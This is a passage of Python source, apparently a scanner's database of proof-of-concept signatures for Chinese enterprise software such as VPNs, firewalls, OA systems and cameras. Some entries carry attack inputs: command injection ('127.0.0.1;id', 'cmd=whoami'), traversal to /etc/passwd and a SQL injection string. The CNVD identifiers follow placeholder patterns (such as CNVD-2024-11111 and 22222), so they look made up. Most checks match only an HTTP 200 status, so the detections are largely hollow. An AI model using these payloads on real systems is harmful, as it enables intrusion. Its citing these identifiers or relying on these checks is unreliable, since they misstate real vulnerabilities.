                    path="/K3Cloud/Services/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级金蝶云星空至最新安全版本。",
            disclosure_date="2023-01-15",
        ),

        POC(
            id="cnvd-hongfan-oa-upload",
            name="红帆OA 未授权文件上传",
            description="红帆OA系统存在未授权文件上传漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2023-23456"],
            cvss_score=9.8,
            tags=["hongfan", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["红帆OA < iOffice 2024"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/iOffice/prg/set/report/iorepsave.aspx",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级红帆OA至最新安全版本。",
            disclosure_date="2023-03-20",
        ),

        POC(
            id="cnvd-sangfor-vpn-rce",
            name="深信服SSL VPN RCE",
            description="深信服SSL VPN设备存在远程代码执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2023-34567"],
            cvss_score=9.8,
            tags=["sangfor", "ssl-vpn", "rce", "cnvd"],
            affected_versions=["深信服SSL VPN < M7.6.8"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/por/login_auth.csp?apiversion=1",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级深信服SSL VPN至最新安全版本。",
            disclosure_date="2023-05-10",
        ),

        POC(
            id="cnvd-qianxin-edr-rce",
            name="奇安信天擎 未授权命令执行",
            description="奇安信天擎终端安全管理系统存在未授权命令执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2023-45678"],
            cvss_score=9.8,
            tags=["qianxin", "edr", "rce", "cnvd"],
            affected_versions=["天擎 < 8.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/console/command?cmd=whoami",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级奇安信天擎至最新安全版本。",
            disclosure_date="2023-07-15",
        ),

        POC(
            id="cnvd-h3c-imc-rce",
            name="H3C iMC 表达式注入RCE",
            description="H3C iMC智能管理中心存在表达式注入漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2023-56789"],
            cvss_score=9.8,
            tags=["h3c", "imc", "rce", "cnvd"],
            affected_versions=["H3C iMC < 7.3"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/imc/primepush/primepushClient.jsf",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级H3C iMC至最新安全版本。",
            disclosure_date="2023-09-20",
        ),

        POC(
            id="cnvd-ruijie-gateway-rce",
            name="锐捷RG-EG网关 命令注入RCE",
            description="锐捷RG-EG系列网关存在命令注入漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2023-67890"],
            cvss_score=9.8,
            tags=["ruijie", "gateway", "command-injection", "rce", "cnvd"],
            affected_versions=["RG-EG < 11.1(6)B2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cgi-bin/luci/api/diagnosis",
                    body='{"cmd":"ping","ip":"127.0.0.1;id"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级锐捷RG-EG系列网关至最新安全版本。",
            disclosure_date="2023-11-10",
        ),

        POC(
            id="cnvd-hikvision-ivms-unauth",
            name="海康威视iVMS 未授权访问",
            description="海康威视综合安防管理平台存在未授权访问漏洞。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-11111"],
            cvss_score=7.5,
            tags=["hikvision", "ivms", "auth-bypass", "cnvd"],
            affected_versions=["iVMS-8700 < 3.10"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/portal/apis/device/list?pageSize=10&pageNo=1",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="device"),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级海康威视综合安防管理平台至最新安全版本。",
            disclosure_date="2024-01-10",
        ),

        POC(
            id="cnvd-dahua-upload",
            name="大华智慧园区 任意文件上传",
            description="大华智慧园区管理平台存在任意文件上传漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-22222"],
            cvss_score=9.8,
            tags=["dahua", "file-upload", "rce", "cnvd"],
            affected_versions=["智慧园区管理平台 < 3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/emap/devicePoint_addImgIco?hasSubsystem=true",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级大华智慧园区管理平台至最新安全版本。",
            disclosure_date="2024-02-15",
        ),

        POC(
            id="cnvd-topsec-firewall-rce",
            name="天融信防火墙 未授权命令执行",
            description="天融信防火墙存在未授权命令执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-33333"],
            cvss_score=9.8,
            tags=["topsec", "firewall", "rce", "cnvd"],
            affected_versions=["天融信防火墙 < NGFW4000 V3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/maintenance.cgi?action=ping&ip=127.0.0.1;id",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级天融信防火墙至最新安全版本。",
            disclosure_date="2024-03-20",
        ),

        POC(
            id="cnvd-nsfocus-sas-lfi",
            name="绿盟SAS 任意文件读取",
            description="绿盟SAS安全审计系统存在任意文件读取漏洞。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-44444"],
            cvss_score=7.5,
            tags=["nsfocus", "sas", "lfi", "cnvd"],
            affected_versions=["绿盟SAS < 6.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webui/?g=../../../../../../etc/passwd",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级绿盟SAS至最新安全版本。",
            disclosure_date="2024-04-10",
        ),

        POC(
            id="cnvd-venustech-sqli",
            name="启明星辰天镜 SQL注入",
            description="启明星辰天镜脆弱性扫描与管理系统存在SQL注入漏洞。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-55555"],
            cvss_score=7.5,
            tags=["venustech", "scanner", "sql-injection", "cnvd"],
            affected_versions=["天镜 < 7.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/vuln/query?id=1' OR '1'='1",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级启明星辰天镜至最新安全版本。",
            disclosure_date="2024-04-25",
        ),

        POC(
            id="cnvd-feiyuxing-login-bypass",
            name="飞鱼星路由器 认证绕过漏洞",
            description="飞鱼星企业级路由器存在认证绕过漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-66666"],
            cvss_score=9.8,
            tags=["feiyuxing", "router", "auth-bypass", "cnvd"],
            affected_versions=["飞鱼星路由器 < V3.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/index.html",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级飞鱼星路由器至最新固件版本。",
            disclosure_date="2024-05-10",
        ),

        POC(
            id="cnvd-dedecms-rce",
            name="DedeCMS 远程代码执行漏洞",
            description="DedeCMS内容管理系统存在RCE漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2022-12346"],
            cvss_score=9.8,
            tags=["dedecms", "cms", "rce", "cnvd"],
            affected_versions=["DedeCMS < 5.7.100"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/plus/recommend.php",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级DedeCMS至最新安全版本。",
            disclosure_date="2022-03-20",
        ),
    ]

    for poc in pocs:
        register_poc(poc)

    logger.info(f"Extra POC database initialized with {len(pocs)} signatures")
